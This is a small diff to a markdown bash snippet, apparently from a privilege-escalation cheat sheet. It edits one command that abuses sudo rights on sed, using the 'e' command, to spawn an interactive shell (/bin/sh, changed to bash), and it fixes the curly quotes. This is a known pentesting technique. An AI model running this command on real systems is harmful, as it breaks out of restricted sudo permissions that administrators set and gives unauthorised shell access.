@@ -1,3 +1,3 @@
 ```bash
-sudo -u USER sed -n ‘1e exec /bin/sh 1>&0’ /etc/hosts
+sudo -u USER /usr/bin/sed -n '1e exec bash 1>&0' /etc/hosts
 ```
